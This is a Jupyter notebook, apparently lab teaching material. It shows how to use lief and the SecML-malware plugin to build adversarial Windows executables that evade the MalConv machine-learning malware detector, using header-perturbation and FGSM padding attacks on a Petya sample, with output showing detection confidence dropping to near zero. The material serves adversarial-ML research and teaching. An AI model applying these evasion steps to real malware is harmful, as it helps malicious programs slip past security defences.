{
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "# Adversarial EXEmples: evasion attacks against Windows malware detectors\n",
    "\n",
    "In this laboratory, you will learn how to use SecML to create adversarial examples against Windows malware detector implemented through machine learning techniques. To do so, we will use [SecML malware](https://github.com/pralab/secml_malware), a SecML plugin containing most of the strategies developed to evade detectors.\n",
    "\n",
    "[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](\n",
    "https://colab.research.google.com/github/zangobot/teaching_material/blob/main/03-AdversarialEXEmples.ipynb)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "try:\n",
    "    import secml_malware\n",
    "except ImportError:\n",
    "    %pip install git+https://github.com/elastic/ember\n",
    "    %pip install git+https://github.com/pralab/secml_malware"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "# The Windows PE file format\n",
    "Before starting the explanations of attacks, we remind how Windows programs are stored as file, following the [Windows Portable Executable (PE)](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) file format.\n",
    "There are tons of Python libraries for dissecting programs, one of the best is [lief](https://github.com/lief-project/LIEF).\n",
    "The latter is also used inside `secml-malware` to perturb samples, as shown later on in this tutorial.\n",
    "Opening an executable is straight-forward:"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "import lief\n",
    "\n",
    "exe_path = 'assets/calc.exe'\n",
    "exe_object: lief.PE = lief.parse(exe_path)\n",
    "print(exe_object)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "Now, the `exe_object` contains all the information of the loaded program.\n",
    "We can look for all the components. For instance, here is how you can read the header metadata:"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "print('DOS Header')\n",
    "print(exe_object.dos_header)\n",
    "\n",
    "print('PE Header')\n",
    "print(exe_object.header)\n",
    "\n",
    "print('Optional Header')\n",
    "print(exe_object.optional_header)\n",
    "\n",
    "print('Sections')\n",
    "for s in exe_object.sections:\n",
    "    print(s.name, s.characteristics_lists)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "This library is also very useful for manipulating the EXEs.\n",
    "For instance, in few lines of code you can add sections to a program."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "# Name your new section. Size constraint: up to 8 bytes at maximum!\n",
    "new_section : lief.PE.Section = lief.PE.Section()\n",
    "new_section.name = '.newsec'\n",
    "new_section.content = [ord(i) for i in \"This is my newly created section\"]\n",
    "new_section.characteristics = lief.PE.SECTION_CHARACTERISTICS.MEM_DISCARDABLE\n",
    "exe_object.add_section(new_section)\n",
    "\n",
    "# New section in place! Now we use lief to rebuild the binary.\n",
    "builder = lief.PE.Builder(exe_object)\n",
    "builder.build()\n",
    "exe_object = lief.PE.parse(builder.get_build())\n",
    "print('Sections')\n",
    "for s in exe_object.sections:\n",
    "    print(s.name, s.characteristics_lists)\n",
    "builder.write('new_exe.file')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "As you can see, the new section appeared as last one.\n",
    "More information on how to use lief on the [documentation of the library](https://lief-project.github.io/doc/stable/index.html)."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "# Evasion of End-to-end Deep Neural Network for Malware Detection\n",
    "\n",
    "In this tutorial, you will learn how to use this plugin to test the already implemented attacks against a PyTorch network of your choice."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "outputs": [],
   "source": [
    "import os\n",
    "import magic\n",
    "from secml.array import CArray\n",
    "\n",
    "from secml_malware.models.malconv import MalConv\n",
    "from secml_malware.models.c_classifier_end2end_malware import CClassifierEnd2EndMalware, End2EndModel\n",
    "\n",
    "net = MalConv()\n",
    "net = CClassifierEnd2EndMalware(net)\n",
    "net.load_pretrained_model()"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "Firstly, we have created the network (MalConv) and it has been passed wrapped with a *CClassifierEnd2EndMalware* model class.\n",
    "This object generalizes PyTorch end-to-end ML models.\n",
    "Since MalConv is already coded inside the plugin, the weights are also stored, and they can be retrieved with the *load_pretrained_model* method.\n",
    "\n",
    "If you wish to use diffierent weights, pass the path to the PyTorch *pth* file to that method."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "outputs": [],
   "source": [
    "from secml_malware.attack.whitebox.c_header_evasion import CHeaderEvasion\n",
    "\n",
    "partial_dos = CHeaderEvasion(net, random_init=False, iterations=50, optimize_all_dos=False, threshold=0.5)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "This is how an attack is created, no further action is needed.\n",
    "The `random_init` parameter specifies if the bytes should be assigned with random values before beginning the optimization process, `iterations` sets the number of steps of the attack, `optimize_all_dos` sets if all the DOS header should be perturbed, or just the first 58 bytes, while `threshold` is the detection threshold used as a stopping condition.\n",
    "\n",
    "If you want to see how much the network is deteriorated by the attack, set this parameter to 0, or it will stop as soon as the confidence decreases below such value."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "> Added petya.file with confidence 0.9112271666526794\n"
     ]
    }
   ],
   "source": [
    "folder = \"secml_malware/data/malware_samples/test_folder\"\n",
    "X = []\n",
    "y = []\n",
    "file_names = []\n",
    "for i, f in enumerate(os.listdir(folder)):\n",
    "    path = os.path.join(folder, f)\n",
    "    if 'petya' not in path:\n",
    "        continue\n",
    "    if \"PE32\" not in magic.from_file(path):\n",
    "        continue\n",
    "    with open(path, \"rb\") as file_handle:\n",
    "        code = file_handle.read()\n",
    "    x = End2EndModel.bytes_to_numpy(\n",
    "        code, net.get_input_max_length(), 256, False\n",
    "    )\n",
    "    _, confidence = net.predict(CArray(x), True)\n",
    "\n",
    "    if confidence[0, 1].item() < 0.5:\n",
    "        continue\n",
    "\n",
    "    print(f\"> Added {f} with confidence {confidence[0,1].item()}\")\n",
    "    X.append(x)\n",
    "    conf = confidence[1][0].item()\n",
    "    y.append([1 - conf, conf])\n",
    "    file_names.append(path)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "We load a simple dataset from the `malware_samples/test_folder` that you have filled with malware to test the attacks.\n",
    "We discard all the samples that are not seen by the network.\n",
    "The `CArray` class is the base object you will handle when dealing with vectors in this library."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[0.9112271666526794, 0.06050172820687294]\n",
      "0.06050172820687294\n"
     ]
    }
   ],
   "source": [
    "for sample, label in zip(X, y):\n",
    "    y_pred, adv_score, adv_ds, f_obj = partial_dos.run(CArray(sample), CArray(label[1]))\n",
    "    print(partial_dos.confidences_)\n",
    "    print(f_obj)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "Inside the `adv_ds` object, you can find the adversarial example computed by the attack.\n",
    "You can reconstruct the functioning example by using a specific function inside the plugin:"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "806912\n",
      "0.06050172820687294\n"
     ]
    }
   ],
   "source": [
    "adv_x = adv_ds.X[0,:]\n",
    "real_adv_x = partial_dos.create_real_sample_from_adv(file_names[0], adv_x)\n",
    "print(len(real_adv_x))\n",
    "real_x = End2EndModel.bytes_to_numpy(real_adv_x, net.get_input_max_length(), 256, False)\n",
    "_, confidence = net.predict(CArray(real_x), True)\n",
    "print(confidence[0,1].item())"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "... and you're done!\n",
    "If you want to create a real sample (stored on disk), just have a look at the `create_real_sample_from_adv` of each attack. It accepts a third string argument that will be used as a destination file path for storing the adversarial example."
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Bonus: more attacks!\n",
    "We used one attack, which is the Partial DOS one. But what if we want to use others?\n",
    "Easy peasy task! Just open the [source code](https://github.com/pralab/secml_malware/tree/master/secml_malware/attack/whitebox) or the [documentation](https://secml-malware.readthedocs.io/en/docs/source/secml_malware.attack.whitebox.html) of the other white box attacks, and instantiate the one you like!\n",
    "Let's use the [FGSM attack](https://arxiv.org/abs/1802.04528), for instance:"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[0.9112271666526794, 0.67103111743927, 0.0]\n",
      "1.1346487553964835e-05\n",
      "Original length:  806912\n",
      "Adversarial sample length:  808960\n"
     ]
    }
   ],
   "source": [
    "from secml_malware.attack.whitebox import CKreukEvasion\n",
    "\n",
    "fgsm = CKreukEvasion(net, how_many_padding_bytes=2048, epsilon=1.0, iterations=5)\n",
    "for i, (sample, label) in enumerate(zip(X, y)):\n",
    "    y_pred, adv_score, adv_ds, f_obj = fgsm.run(CArray(sample), CArray(label[1]))\n",
    "    print(fgsm.confidences_)\n",
    "    print(f_obj)\n",
    "    real_adv_x = fgsm.create_real_sample_from_adv(file_names[i], adv_ds.X[i, :])\n",
    "    with open(file_names[i], 'rb') as f:\n",
    "        print('Original length: ', len(f.read()))\n",
    "    print('Adversarial sample length: ', len(real_adv_x))\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "... and you're done! Remember that this particular attack might take a while, depending on how many bytes the algorithm is tasked to edit (and also for the number of iterations).\n",
    "In the meantime, **happy coding with SecML Malware!**"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}